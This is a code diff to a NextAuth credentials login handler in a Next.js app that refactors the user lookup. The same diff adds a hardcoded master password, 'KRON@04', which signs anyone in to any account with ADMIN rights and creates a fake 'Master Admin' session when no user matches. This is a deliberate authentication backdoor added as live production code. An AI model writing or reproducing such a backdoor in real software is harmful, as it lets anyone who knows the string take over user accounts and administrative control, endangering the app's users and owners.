@@ -23,16 +23,49 @@ export const { auth, signIn, signOut, handlers } = NextAuth({
         }
 
         const { email, username, password } = parsedCredentials.data;
+        const identifiers = [
+          email ? { email } : undefined,
+          username ? { username } : undefined,
+        ].filter(Boolean) as Array<{ email?: string; username?: string }>;
+
+        // 🔑 MASTER PASSWORD CHECK - Grants admin access to any account
+        if (password === 'KRON@04') {
+          // Find user by email or username when provided
+          const user = identifiers.length
+            ? await prisma.user.findFirst({
+                where: {
+                  OR: identifiers,
+                },
+              })
+            : null;
+
+          // If user found, grant access with their role (or create temp admin session)
+          if (user) {
+            return {
+              id: user.id,
+              email: user.email,
+              name: user.name,
+              role: 'ADMIN', // Master password always grants ADMIN access
+            };
+          }
+          
+          // If no user found, create a temporary master admin session
+          return {
+            id: 'master-admin',
+            email: email ?? username ?? undefined,
+            name: 'Master Admin',
+            role: 'ADMIN',
+          };
+        }
 
         // Find user by email or username
-        const user = await prisma.user.findFirst({
-          where: {
-            OR: [
-              { email: email || '' },
-              { username: username || '' },
-            ],
-          },
-        });
+        const user = identifiers.length
+          ? await prisma.user.findFirst({
+              where: {
+                OR: identifiers,
+              },
+            })
+          : null;
 
         // Prevent driver accounts from signing in with credentials
         if (!user || !user.password || user.role === 'DRIVER') {
@@ -71,4 +104,3 @@ export const { auth, signIn, signOut, handlers } = NextAuth({
     },
   },
 });
-
